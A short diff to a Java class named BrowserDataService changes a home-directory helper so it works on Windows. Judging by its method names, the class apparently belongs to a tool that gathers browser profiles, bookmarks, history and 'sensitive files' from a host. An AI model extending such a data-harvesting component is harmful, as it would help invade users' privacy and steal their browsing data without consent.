@@ -36,7 +36,7 @@ public class BrowserDataService extends ComponentService {
 
     public Map<String, Object> scanProfiles() throws Exception {
         int      osType      = detectOS();
-        String   homeDir     = getHomeDir();
+        String   homeDir     = getHomeDir(osType);
         List<Map<String, Object>> allProfiles = discoverAllProfiles(osType, homeDir);
 
         Map<String, Object> data = new HashMap<String, Object>();
@@ -52,7 +52,7 @@ public class BrowserDataService extends ComponentService {
 
     public Map<String, Object> extractBookmarks() throws Exception {
         int      osType      = detectOS();
-        String   homeDir     = getHomeDir();
+        String   homeDir     = getHomeDir(osType);
         List<Map<String, Object>> allProfiles = discoverAllProfiles(osType, homeDir);
 
         Map<String, Object> data = new HashMap<String, Object>();
@@ -67,7 +67,7 @@ public class BrowserDataService extends ComponentService {
 
     public Map<String, Object> extractHistory(int limit) throws Exception {
         int      osType      = detectOS();
-        String   homeDir     = getHomeDir();
+        String   homeDir     = getHomeDir(osType);
         List<Map<String, Object>> allProfiles = discoverAllProfiles(osType, homeDir);
 
         Map<String, Object> data = new HashMap<String, Object>();
@@ -82,7 +82,7 @@ public class BrowserDataService extends ComponentService {
 
     public Map<String, Object> listSensitiveFiles() throws Exception {
         int      osType      = detectOS();
-        String   homeDir     = getHomeDir();
+        String   homeDir     = getHomeDir(osType);
         List<Map<String, Object>> allProfiles = discoverAllProfiles(osType, homeDir);
 
         Map<String, Object> data = new HashMap<String, Object>();
@@ -112,7 +112,14 @@ public class BrowserDataService extends ComponentService {
         return "linux";
     }
 
-    private String getHomeDir() throws Exception {
+    private String getHomeDir(int osType) throws Exception {
+        if (osType == OS_WINDOWS) {
+            String userProfile = execFast(winCmd("echo %USERPROFILE%")).trim();
+            if (!userProfile.isEmpty() && !userProfile.contains("%USERPROFILE%")) {
+                return userProfile;
+            }
+            return execFast(winCmd("echo %HOMEDRIVE%%HOMEPATH%")).trim();
+        }
         return execFast("echo $HOME 2>/dev/null").trim();
     }
 
